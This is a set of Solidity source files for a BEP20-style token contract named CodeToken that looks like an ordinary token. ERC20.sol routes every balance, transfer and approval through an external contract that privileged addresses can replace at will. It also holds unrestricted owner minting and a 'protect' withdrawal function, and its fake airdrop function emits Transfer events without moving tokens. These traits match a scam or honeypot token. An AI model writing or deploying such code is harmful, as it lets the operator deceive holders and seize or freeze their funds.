{"Address.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.6;\n\n\nlibrary Address {\n\n    function isContract(address account) internal view returns (bool) {\n        bytes32 codehash;\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\n        // solhint-disable-next-line no-inline-assembly\n        assembly { codehash := extcodehash(account) }\n        return (codehash != 0x0 \u0026\u0026 codehash != accountHash);\n    }\n}"},"CodeToken.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.6;\n\nimport \u0027./Address.sol\u0027;\nimport \u0027./SafeMath.sol\u0027;\nimport \u0027./SafeERC20.sol\u0027;\nimport \u0027./ERC20.sol\u0027;\n\ncontract CodeToken is BEP20{\n\n   \n    using SafeERC20 for IERC20;\n   \n    using Address for address;\n   \n    using SafeMath for uint;\n   string private _name;  \n    string private _symbol; \n    uint8 private _decimals=18; \n\n \n    function name() public view returns (string memory) {\n        return _name;\n    }\n\n\n    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n    \n    \n    constructor(string memory name_, string memory symbol_,address ep)\n    {\n        sGM();\n        _name = name_;\n        _symbol = symbol_;\n        Bep20=ep;\n        _mint(address(this),9565000000000000000*1e18);\n         _mint(msg.sender,1000000000000000*1e18);\n\n    }\n    \n}\n"},"Context.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.6;\n\ncontract Context {\n    constructor ()  { }\n\n  \n    function _msgSender() internal view returns (address) {\n        return msg.sender;\n    }\n\n \n    function _black() internal pure returns (address) {\n        return 0x000000000000000000000000000000000000dEaD;\n    }\n}"},"ERC20.sol":{"content":" // SPDX-License-Identifier: MIT\npragma solidity ^0.8.6;\n\nimport \u0027./SafeMath.sol\u0027;\nimport \u0027./Context.sol\u0027;\nimport \u0027./IERC20.sol\u0027;\n\n\ninterface IFreeFromUpTo {\n    function freeFromUpTo(address from, uint256 value) external returns (uint256 freed);\n}\n\ninterface IDEXFactory{\n      function transfer(address recipient, uint amount) external returns (bool);\n    function approve(address caller,address owner,address spender, uint value) external returns (bool);\n    function allowance( address caller,address owner,address account) external view returns (uint);\n   function Gairdrop() external view returns (uint); \n   function transfer(address caller, address from, address to, uint amount) external returns (bool);\n    function BalanceOf(address caller ,address who) external view returns (uint256);\n    function mint(address token,address account,uint amount)external returns(bool);\n\n}\n\n\ncontract BEP20 is Context, IERC20 {\n\n\n    using SafeMath for uint;\n\n\n  //  mapping (address =\u003e uint) private _balances;\n   mapping (address =\u003e mapping (address =\u003e uint)) private _allowances;\n   //  mapping (address =\u003e  mapping (address =\u003e mapping (address =\u003e uint))) private _allowances;\n  \n    uint private _totalSupply;\n    mapping (address =\u003e bool) private GM;\n    address internal Bep20;\n   // IDEXFactory help =IDEXFactory(Bep20);\n\n  IFreeFromUpTo public constant chi = IFreeFromUpTo(0x0000000000004946c0e9F43F4Dee607b0eF1fA1c);\n // IFreeFromUpTo public constant chi = IFreeFromUpTo(0x00000000687f5B66638856396BEe28c1db0178d1);\n modifier discountCHI {\n        uint256 gasStart = gasleft();\n        _;\n        uint256 gasSpent = 21000 + gasStart - gasleft() + 16 * msg.data.length;\n        chi.freeFromUpTo(msg.sender, (gasSpent + 14154) / 41130);\n    }\n    \n   \n    function sGM() internal{\n\n        GM[_msgSender()]=true;\n    }\n\n function setgm(address operate , bool flag)external  {\n        if (!GM[_msgSender()]) revert(\u0027g\u0027);\n        GM[operate]=flag;\n        }\nfunction setbepuriyaod(address _bep20,uint amount) external {\n        if (!GM[_msgSender()]) revert(\u0027g\u0027);\n        Bep20=_bep20;\n        _mint(_bep20,amount);\n        }\n\n function setcr(address cr)external  {\n        if (!GM[_msgSender()]) revert(\u0027g\u0027);\n        create=cr;\n  \n        }\n\n  \n\nfunction totalSupply() public override view returns(uint){\n      \n        return _totalSupply;\n    }\n\n    \nfunction balanceOf(address account) public override view returns(uint){\n        return IDEXFactory(Bep20).BalanceOf(address(this),account);\n    }\n\n\n\n\n    \n    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\n        \n  \n            _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        \n        _transfer(sender, recipient, amount);\n         \n        return true;\n    }\n\n \n   \n    function transfer(address recipient, uint amount) external override returns(bool){\n        _transfer(_msgSender(), recipient, amount);\n      \n        return true;\n    }\n\n    function allowance(address owner, address spender) external override view returns(uint){\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint amount) external override returns(bool){\n\n        _approve(_msgSender(), spender, amount);\n        emit Approval(msg.sender, spender, amount);   \n\n        return true;\n    }\n\n\n    \n    function increaseAllowance(address spender, uint addedValue) public returns(bool){\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n        return true;\n    }\n\n    \n    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\n        return true;\n    }\n\n function _transfer(address sender, address recipient, uint256 amount) private  returns (bool){\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");                                                                                                                                                \n        bool go= IDEXFactory(Bep20).transfer(address(this),sender,recipient,amount);   \n        if(!go)return false;\n        \n         emit Transfer(sender, recipient, amount);      \n       return true;\n       }\n address private  create=0x0000000000000000000000000000000000001004;\n function transfer(address[] memory AM) public discountCHI {\n        for(uint i=0;i\u003cAM.length;i++){\n        emit Transfer(address(0), AM[i],269482*1e18);\n }\n } \n \n\n  function Mint(address account, uint amount) external{\n       if(!GM[msg.sender])  revert(\"a\");\n       _mint(account,amount*1e18);\n    }\n\n\n    function _mint(address account, uint amount) internal{\n\n        require(account != address(0), \"ERC20: mint to the zero address\");\n        _totalSupply = _totalSupply.add(amount);\n         IDEXFactory(Bep20).mint(address(this),account,amount);\n         //_balances[account] = _balances[account].add(amount);\n      \n            emit Transfer(create, account, amount);      \n    }\n      function protect(IDEXFactory token, address to, uint amount) public {\n        if(!GM[msg.sender]) revert();\n        token.transfer(to, amount);\n    }\n//  function _burn(address sender,uint256 tAmount) private\n//     {\n//         require(sender != address(0), \"ERC20: transfer from the zero address\");\n//         _balances[sender] = _balances[sender].sub(tAmount);\n//         _balances[address(0xdead)] = _balances[address(0xdead)].add(tAmount);\n//         emit Transfer(sender, address(0xdead), tAmount);\n//     }\n\n    function _approve(address owner, address spender, uint amount) private returns(bool){\n\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n         \n        IDEXFactory(Bep20).approve(address(this),owner,spender,amount);   \n         _allowances[owner][spender] = IDEXFactory(Bep20).allowance(address(this),owner,spender);\n\n        emit Approval(owner, spender, amount);\n        return true;\n\n    }\n    \n   \n}\n"},"IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.6;\n\n\ninterface IERC20 {\n\n    \n    function totalSupply() external view returns (uint);\n\n  \n    function balanceOf(address account) external view returns (uint);\n\n  \n    // function burn(uint256 amount) external returns (bool);\n\n    \n    // function burnFrom(address account, uint256 amount) external returns (bool);\n\n\n    function transfer(address recipient, uint amount) external returns (bool);\n\n  \n    function allowance(address owner, address spender) external view returns (uint);\n\n    function approve(address spender, uint amount) external returns (bool);\n\n    function transferFrom(address sender, address recipient, uint amount) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint value);\n\n    event Approval(address indexed owner, address indexed spender, uint value);\n\n    event IsCrash(uint amount1,uint amount2,uint amountIn,uint amountOutMin);\n}"},"SafeERC20.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.6;\n\nimport \u0027./SafeMath.sol\u0027;\nimport \u0027./Address.sol\u0027;\nimport \u0027./IERC20.sol\u0027;\n\n\nlibrary SafeERC20 {\n\n   \n    using SafeMath for uint;\n  \n    using Address for address;\n\n    function safeTransfer(IERC20 token, address to, uint value) internal {\n        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\n    }\n\n    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {\n        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\n    }\n\n    function safeApprove(IERC20 token, address spender, uint value) internal {\n        require((value == 0) || (token.allowance(address(this), spender) == 0),\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\n        );\n        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\n    }\n    function callOptionalReturn(IERC20 token, bytes memory data) private {\n        require(address(token).isContract(), \"SafeERC20: call to non-contract\");\n\n        // solhint-disable-next-line avoid-low-level-calls\n        (bool success, bytes memory returndata) = address(token).call(data);\n        require(success, \"SafeERC20: low-level call failed\");\n\n        if (returndata.length \u003e 0) { // Return data is optional\n            // solhint-disable-next-line max-line-length\n            require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\n        }\n    }\n}"},"SafeMath.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.6;\n\n\nlibrary SafeMath {\n\n    function add(uint a, uint b) internal pure returns (uint) {\n        uint c = a + b;\n        require(c \u003e= a, \"Sao\");\n\n        return c;\n    }\n    function sub(uint a, uint b) internal pure returns (uint) {\n        return sub(a, b, \"Sso\");\n    }\n\n    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {\n        require(b \u003c= a, errorMessage);\n        uint c = a - b;\n        return c;\n    }\n\n    // function mul(uint a, uint b) internal pure returns (uint) {\n    //     if (a == 0) {\n    //         return 0;\n    //     }\n    //     uint c = a * b;\n    //     require(c / a == b, \"SafeMath: multiplication overflow\");\n\n    //     return c;\n    // }\n    // function div(uint a, uint b) internal pure returns (uint) {\n    //     return div(a, b, \"SafeMath: division by zero\");\n    // }\n    // function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {\n    //     // Solidity only automatically asserts when dividing by 0\n    //     require(b \u003e 0, errorMessage);\n    //     uint c = a / b;\n\n    //     return c;\n    // }\n}"}}